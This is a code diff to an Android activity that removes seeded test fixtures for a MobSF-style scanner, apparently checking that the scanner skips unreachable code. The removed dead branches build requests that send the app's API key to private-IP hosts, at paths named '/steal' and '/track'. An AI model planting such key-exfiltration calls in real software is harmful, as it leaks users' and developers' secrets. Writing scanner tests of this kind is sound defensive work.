@@ -61,22 +61,8 @@ public class NetworkActivity extends AppCompatActivity {
                 int responseCode = connection.getResponseCode();
                 runOnUiThread(() -> tvResult.setText("HTTP Response Code: " + responseCode));
                 connection.disconnect();
-
-                if (false) {
-                    // DEAD BRANCH - reachability test: should NOT be flagged
-                    // Simulated MobSF Rule: android_ip_disclosure
-                    // Pattern: IP address regex (e.g. 192.168.1.1)
-                    // input_case: exact | type: Regex
-                    // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
-                    String payload = "key=" + MainActivity.API_KEY;
-                    URL u = new URL("http://192.168.1.1/steal?" + payload);
-                    HttpURLConnection c = (HttpURLConnection) u.openConnection();
-                    c.setRequestMethod("POST");
-                    c.connect();
-                }
             } catch (IOException e) {
                 runOnUiThread(() -> tvResult.setText("HTTP Error: " + e.getMessage()));
-                sendToAnalytics("http://example.com");
             }
         }).start();
     }
@@ -113,36 +99,8 @@ public class NetworkActivity extends AppCompatActivity {
                 connection.disconnect();
             } catch (Exception e) {
                 runOnUiThread(() -> tvResult.setText("HTTPS Error: " + e.getMessage()));
-                sendToAnalytics("https://example.com");
             }
         }).start();
     }
 
-    /**
-     * Analytics endpoint - permanently disabled via if(true){throw}.
-     * The HTTP call after the throw block is dead code that still compiles.
-     *
-     * VULNERABILITY (if reachable): Hidden Analytics Cleartext Endpoint
-     * MobSF Rule: android_ip_disclosure
-     * Pattern: IP address regex (e.g. 172.16.0.5)
-     * input_case: exact | type: Regex
-     * CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
-     */
-    private void sendToAnalytics(String url) {
-        if (true) {
-            throw new UnsupportedOperationException("Analytics disabled");
-        }
-        // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
-        // Simulated MobSF Rule: android_ip_disclosure
-        // Pattern: IP address regex (e.g. 172.16.0.5)
-        // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
-        try {
-            HttpURLConnection conn = (HttpURLConnection)
-                new URL("http://172.16.0.5/track?data="
-                        + url + "&key=" + MainActivity.API_KEY).openConnection();
-            conn.connect();
-        } catch (IOException e) {
-            // dead path
-        }
-    }
 }
